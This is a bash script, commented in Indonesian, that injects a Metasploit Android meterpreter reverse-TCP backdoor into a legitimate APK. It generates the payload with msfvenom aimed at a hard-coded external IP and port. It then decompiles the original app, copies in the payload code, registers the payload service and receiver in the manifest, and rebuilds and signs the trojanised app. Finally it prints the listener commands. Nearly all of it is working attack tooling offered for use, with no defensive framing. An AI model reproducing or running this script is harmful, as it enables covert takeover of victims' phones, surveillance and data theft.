#!/bin/bash

# --- KONFIGURASI ---
ORIG_APK="original.apk"        # Ganti nama APK asli kamu di sini
OUTPUT_APK="backdoor.apk"
LHOST="8.215.192.205"
LPORT="4444"

echo "=== Android APK Backdoor Injector ==="
echo "[*] LHOST=$LHOST | LPORT=$LPORT"

WORKDIR=$(pwd)/apk_inject_temp
rm -rf $WORKDIR
mkdir -p $WORKDIR

echo "[1/7] Membuat payload dengan msfvenom..."
msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o $WORKDIR/payload.apk

echo "[2/7] Dekompilasi APK asli..."
apktool d -f "$ORIG_APK" -o $WORKDIR/original_src

echo "[3/7] Dekompilasi APK payload..."
apktool d -f "$WORKDIR/payload.apk" -o $WORKDIR/payload_src

echo "[4/7] Menyalin smali payload ke APK asli..."
cp -r $WORKDIR/payload_src/smali/com/metasploit $WORKDIR/original_src/smali/com/

echo "[5/7] Edit AndroidManifest.xml..."
sed -i '/<\/application>/i \
<service android:name="com.metasploit.stage.PayloadService" android:exported="true"/>\n\
<receiver android:name="com.metasploit.stage.PayloadReceiver" android:exported="true"/>' $WORKDIR/original_src/AndroidManifest.xml

echo "[6/7] Build APK..."
apktool b $WORKDIR/original_src -o $WORKDIR/unsigned.apk

echo "[7/7] Buat keystore dan sign APK..."
keytool -genkey -v -keystore $WORKDIR/key.keystore -alias keyalias -keyalg RSA -keysize 2048 -validity 10000 -storepass pass123 -keypass pass123 -dname "CN=Inject,O=Dev,C=ID"

jarsigner -verbose -keystore $WORKDIR/key.keystore -storepass pass123 -keypass pass123 $WORKDIR/unsigned.apk keyalias

zipalign -v 4 $WORKDIR/unsigned.apk $OUTPUT_APK

echo ""
echo "[+] APK backdoor selesai: $OUTPUT_APK"
echo "[*] Jalankan listener di Metasploit dengan perintah berikut:"
echo ""
echo "msfconsole"
echo "use exploit/multi/handler"
echo "set payload android/meterpreter/reverse_tcp"
echo "set LHOST 0.0.0.0"
echo "set LPORT 4444"
echo "run"
